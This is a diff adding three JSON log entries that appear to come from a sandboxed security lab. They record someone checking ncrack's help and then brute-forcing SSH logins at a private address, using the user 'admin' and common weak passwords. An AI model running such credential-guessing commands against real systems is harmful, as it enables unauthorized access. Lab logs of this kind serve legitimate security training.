@@ -1,0 +1,3 @@
+{"sandbox_id": "121", "timestamp_str": "2020-12-11T09:10:13.623Z", "cmd_type": "bash-command", "cmd": "ncrack -h"}
+{"sandbox_id": "121", "timestamp_str": "2020-12-11T09:12:18.403Z", "cmd_type": "bash-command", "cmd": "ncrack --user admin --pass password,admin,123456"}
+{"sandbox_id": "121", "timestamp_str": "2020-12-11T09:12:59.674Z", "cmd_type": "bash-command", "cmd": "ncrack --user admin --pass password,admin,123456 ssh://10.1.26.9"}
